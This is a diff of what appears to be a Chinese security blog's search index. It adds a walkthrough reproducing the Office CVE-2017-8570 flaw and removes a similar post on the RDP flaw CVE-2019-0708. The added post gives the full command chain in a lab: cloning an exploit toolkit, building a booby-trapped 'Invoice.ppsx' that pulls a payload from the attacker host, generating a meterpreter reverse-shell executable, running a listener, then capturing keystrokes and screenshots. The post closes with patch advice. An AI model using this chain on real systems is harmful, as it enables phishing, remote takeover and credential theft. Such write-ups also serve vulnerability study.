@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>CVE-2017-8570</title>
+      <link href="/2019/11/17/CVE-2017-8570/"/>
+      <url>/2019/11/17/CVE-2017-8570/</url>
+      
+        <content type="html"><![CDATA[<p><strong></strong></p><center><strong>不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></center><p></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2017 年 7 月，微软在例行的月度补丁中修复了多个 Microsoft Office 漏洞，其中的CVE-2017-8570漏洞为一个逻辑漏洞，利用方法简单。网上已经出现该漏洞的利用代码，影响范围较广。</p><p>该漏洞为 Microsoft Office 的一个远程代码执行漏洞。其成因是 Microsoft PowerPoint 执行时会初始化 Script”Moniker“ 对象，而在 PowerPoint 播放动画期间会激活该对象，从而执行 sct 脚本（Windows Script Component）文件。攻击者可以欺骗用户运行含有该漏洞的PPT文件，导致获取和当前登录用户相同的代码执行权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre class="line-numbers language-text"><code class="language-text">Microsoft Office 2007 Service Pack 3Microsoft Office 2010 Service Pack 2 (32-bit editions)Microsoft Office 2010 Service Pack 2 (64-bit editions)Microsoft Office 2013 RT Service Pack 1Microsoft Office 2013 Service Pack 1 (32-bit editions)Microsoft Office 2013 Service Pack 1 (64-bit editions)Microsoft Office 2016 (32-bit edition)Microsoft Office 2016 (64-bit edition)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h3><p><strong>操作系统：</strong> kali</p><p><strong>Metasploit：</strong> v5.0.59-dev</p><p><strong>IP：</strong> 192.168.150.129</p><h3 id="受害者（靶机）"><a href="#受害者（靶机）" class="headerlink" title="受害者（靶机）"></a>受害者（靶机）</h3><p><strong>操作系统：</strong> windows 7 sp1 x86</p><p><strong>Office版本：</strong> Office 专业增强版 2016</p><p><strong>IP：</strong> 192.168.150.132</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="克隆配置-EXP-文件"><a href="#克隆配置-EXP-文件" class="headerlink" title="克隆配置 EXP 文件"></a>克隆配置 EXP 文件</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># git clone https://github.com/tezukanice/Office8570.git &amp;&amp; cd Office8570</span>root@kali:~/Office8570<span class="token comment" spellcheck="true"># mkdir temlate &amp;&amp; mv template.ppsx temlate</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="生成恶意-PPSX-文件"><a href="#生成恶意-PPSX-文件" class="headerlink" title="生成恶意 PPSX 文件"></a>生成恶意 PPSX 文件</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/Office8570<span class="token comment" spellcheck="true"># python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://192.168.150.129/logo.doc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/BZ4si2FtV8g3Unk.png" alt=" "></p><h3 id="生成反弹-shell-的-exe-文件"><a href="#生成反弹-shell-的-exe-文件" class="headerlink" title="生成反弹 shell 的 exe 文件"></a>生成反弹 shell 的 exe 文件</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/CVE/office/CVE-2017-8570<span class="token comment" spellcheck="true"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.150.129 LPORT=6666 -f exe > /tmp/fuck.exe</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/tuLvSFXHRG7MYB6.png" alt=" "></p><h3 id="监听来自-ppsx-执行反弹-shell"><a href="#监听来自-ppsx-执行反弹-shell" class="headerlink" title="监听来自 ppsx 执行反弹 shell"></a>监听来自 ppsx 执行反弹 shell</h3><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~/CVE/office/CVE-2017-8570<span class="token comment" spellcheck="true"># python cve-2017-8570_toolkit.py -M exp -e http://192.168.150.129/fuck.exe -l /tmp/fuck.exe</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/gAULPBVSbFeintz.png" alt=" "></p><h3 id="msf-监听"><a href="#msf-监听" class="headerlink" title="msf 监听"></a>msf 监听</h3><pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handler msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> lhost 192.168.150.129lhost <span class="token operator">=</span><span class="token operator">></span> 192.168.150.129msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> lport 6666lport <span class="token operator">=</span><span class="token operator">></span> 6666msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.150.129:6666 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/zd5nTbr6vOHuYE7.png" alt=" "></p><h3 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h3><ol><li>将 Invoice.ppsx 放到 windows 中并双击打开，攻击者接受到反弹 shell</li></ol><p><img src="https://i.loli.net/2019/11/17/nwNtdZHxGrTgXka.png" alt=" "></p><p><img src="https://i.loli.net/2019/11/17/auix1rIZvk8W4lP.png" alt=" "></p><ol start="2"><li>后续渗透</li></ol><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> screenshot    <span class="token comment" spellcheck="true"># 截屏</span>Screenshot saved to: /root/CVE/office/CVE-2017-8570/SCgNajFh.jpegmeterpreter <span class="token operator">></span> keyscan_start     <span class="token comment" spellcheck="true"># 开启键盘记录</span>Starting the keystroke sniffer <span class="token punctuation">..</span>.meterpreter <span class="token operator">></span> keyscan_dump      <span class="token comment" spellcheck="true"># 输出键盘记录</span>Dumping captured keystrokes<span class="token punctuation">..</span>.admin<span class="token operator">&lt;</span>CR<span class="token operator">></span>adminmeterpreter <span class="token operator">></span> keyscan_stop      <span class="token comment" spellcheck="true"># 关闭键盘记录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/17/TUAqQtXD9631Oys.png" alt=" "></p><p><img src="https://i.loli.net/2019/11/17/6L7I24olCurNdJh.png" alt=" "></p><p><img src="https://i.loli.net/2019/11/17/ldm9EPwuKIoN5ke.png" alt=" "></p><p><strong>注：</strong>如果靶机是 64 位的，上面所有的 <code>windows/meterpreter/reverse_tcp</code> 替换为 <code>windows/x64/meterpreter/reverse_tcp</code></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li><p>及时安装微软2017年7月发布的最新补丁</p></li><li><p>经得住诱惑，不打开来历不明的 office 文件如果没有打补丁的话，其实还有一直比较稳妥的打开 PPT 的方法，就是不双击打开 PPT 文件。先打开 PPT 程序，然后将文件直接拖动到 PPT 程序中打开 是不会触发运行 exe 程序的</p></li></ol><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.freebuf.com/vuls/144054.html" target="_blank" rel="noopener">Office CVE-2017-8570远程代码执行漏洞复现</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> system security </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> windows </tag>
+            
+            <tag> office </tag>
+            
+            <tag> cve-2019-0708 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>linux 权限</title>
       <link href="/2019/11/13/linux-%E6%9D%83%E9%99%90/"/>
       <url>/2019/11/13/linux-%E6%9D%83%E9%99%90/</url>
@@ -626,35 +655,6 @@
             <tag> sqli-labs </tag>
             
             <tag> SQL Injection </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[漏洞复现]CVE-2019-0708</title>
-      <link href="/2019/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-0708/"/>
-      <url>/2019/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-0708/</url>
-      
-        <content type="html"><![CDATA[<p><strong></strong></p><center><strong>不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></center><p></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2019 年 5 月 14 日微软官方发布安全补丁，其中修复了远程桌面协议（RDP）远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，向目标Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。由于该漏洞存在于 RDP 协议的预身份验证阶段，因此漏洞利用无需进行用户交互操作。该漏洞存在被不法分子利用进行蠕虫攻击的可能。该漏洞不会影响到 windows 8.1 和 windows 10。</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><p>测试机：parrot</p><p>靶机：win7 企业版 32 位（需要开启3389）</p><p>测试机IP：192.168.150.130</p><p>靶机IP：192.168.150.132</p><h3 id="测试机"><a href="#测试机" class="headerlink" title="测试机"></a>测试机</h3><ul><li>下载 poc</li></ul><pre><code>git clone https://github.com/n1xbyte/CVE-2019-0708.git</code></pre><ul><li>安装执行 poc 的库</li></ul><pre><code>pip3 install impacket</code></pre><h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><p>开启 3389</p><p><img src="https://i.loli.net/2019/09/16/C4nDQa7jlzAZo52.png" alt="0708-1.png"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol><li>更新 metasploit</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># apt-get install metasploit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>扫描 cve-2019-0708 漏洞</li></ol><p><img src="https://i.loli.net/2019/09/16/sJILcO5Hw8MmFah.png" alt="0708-2.png"><br><img src="https://i.loli.net/2019/09/16/IB5pQLR72TivONZ.png" alt="0708-3.png"></p><p>注：the target is vulnerable（目标存在这个漏洞）</p><ol start="3"><li>运行 poc 脚本</li></ol><p><img src="https://i.loli.net/2019/09/16/HgMjharwt8BmXAL.png" alt="0708-4.png"></p><ol start="4"><li>查看 win7 运行状况</li></ol><p><img src="https://i.loli.net/2019/09/16/E3ZAnJ5tU6jdlKk.png" alt="0708-5.png"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ol><li><p>安装杀毒软件</p></li><li><p>更新系统，打补丁</p><p> 补丁地址：</p><p> <a href="https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708" target="_blank" rel="noopener">Windows XP、Windows 2003</a></p><p> <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4499175" target="_blank" rel="noopener">Windows 7、Windows 2008R2</a></p><p> <a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4499180" target="_blank" rel="noopener">Windows 2008</a></p></li><li><p>将 3389 设为 “网络身份认证”</p></li></ol><p><img src="https://i.loli.net/2019/09/16/qBTWYz8imMOZRH4.png" alt="0708-6.png"></p><ol start="4"><li><p>开启防火墙，阻止 3389 数据通过</p></li><li><p>关闭 3389 端口</p></li></ol><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.jianshu.com/p/2363c6364bb7" target="_blank" rel="noopener">【漏洞复现】CVE 2019-0708 漏洞利用</a></p><p><a href="https://blog.csdn.net/qq37724861/article/details/90286293" target="_blank" rel="noopener">CVE-2019-0708 微软补丁更新</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
-      
-      
-      <categories>
-          
-          <category> system security </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> windows </tag>
-            
-            <tag> RDP </tag>
-            
-            <tag> cve-2019-0708 </tag>
             
         </tags>
       
